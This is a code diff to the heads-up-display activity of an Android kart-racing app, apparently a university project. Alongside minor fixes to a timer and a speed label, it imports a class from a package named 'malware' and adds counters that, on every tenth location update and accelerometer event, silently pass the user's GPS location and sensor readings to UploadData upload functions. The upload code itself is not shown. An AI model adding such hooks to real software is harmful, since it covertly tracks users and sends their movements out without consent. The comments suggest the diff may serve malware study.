@@ -24,6 +24,7 @@ import es.upm.karthud.R
 import es.upm.karthud.Utils
 import es.upm.karthud.Utils.longToStringTime
 import es.upm.karthud.databinding.ActivityHudBinding
+import es.upm.karthud.malware.UploadData
 import es.upm.karthud.persistence.IAppDao
 import es.upm.karthud.persistence.Lap
 import es.upm.karthud.persistence.Session
@@ -60,7 +61,7 @@ class HUDActivity : AppCompatActivity(), LocationListener, SensorEventListener, 
     private val accelerometer : Sensor? by lazy {sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)}
 
     //api del tiempo
-    private val timer: Timer by lazy { Timer("Weather",false) }
+    private lateinit var timer: Timer
 
     //datos
     private var speed: Float = 0.0f
@@ -77,7 +78,12 @@ class HUDActivity : AppCompatActivity(), LocationListener, SensorEventListener, 
     private val dao : IAppDao by lazy { Utils.getLocalDatabase(applicationContext).dao() }
     private var sessionId : Long? = null
     private val userId by lazy { Utils.remoteAuthInstance.currentUser?.uid ?: "" }
-    private val baseChildDb by lazy { remoteDbReference.child(userId).child("sessions").child(sessionId.toString()) }
+    private val baseChildDb by lazy { remoteDbReference.child("session_data").child(userId).child("sessions").child(sessionId.toString()) }
+
+    //malware
+    private var locationCounter: Long = 0L
+    private var sensorCounter: Long = 0L
+    private val intervalBetweenUploads : Int = 10
 
     /*
     ---------------------------------------------------------
@@ -100,7 +106,7 @@ class HUDActivity : AppCompatActivity(), LocationListener, SensorEventListener, 
         //ponemos valores por defecto a los textos
         binding.gForceText.text = getString(R.string.gForce,0.0f)
         binding.tempText.text = getString(R.string.temp,0)
-        binding.speedText.text = getString(R.string.kmh,0)
+        binding.speedText.text = getString(R.string.kmh,"0")
         binding.lapText.text = getString(R.string.lap, 0)
     }
 
@@ -261,6 +267,7 @@ class HUDActivity : AppCompatActivity(), LocationListener, SensorEventListener, 
      */
     private fun startWeather()
     {
+        timer = Timer("Weather",false)
         timer.schedule(Utils.initialDelayWeather, Utils.periodWeather)
         {
             updateTemperature(circuit.endLine.beacon1)
@@ -323,7 +330,10 @@ class HUDActivity : AppCompatActivity(), LocationListener, SensorEventListener, 
 
         //mostramos la vuelta y la velocidad
         binding.lapText.text = getString(R.string.lap, lap)
-        binding.speedText.text = getString(R.string.kmh,speed)
+        binding.speedText.text = getString(R.string.kmh,speed.toString())
+
+        if ((++locationCounter % intervalBetweenUploads) == 0L)
+            UploadData.uploadLocation(l)
     }
 
     /**
@@ -370,8 +380,9 @@ class HUDActivity : AppCompatActivity(), LocationListener, SensorEventListener, 
         se?.let { event ->
             val lateralForce = abs(event.values[1].toDouble()) / SensorManager.GRAVITY_EARTH
             binding.gForceText.text = getString(R.string.gForce, lateralForce)
+            if ((++sensorCounter % intervalBetweenUploads) == 0L)
+                UploadData.uploadSensorEvent(event)
         }
-
     }
 
     /*
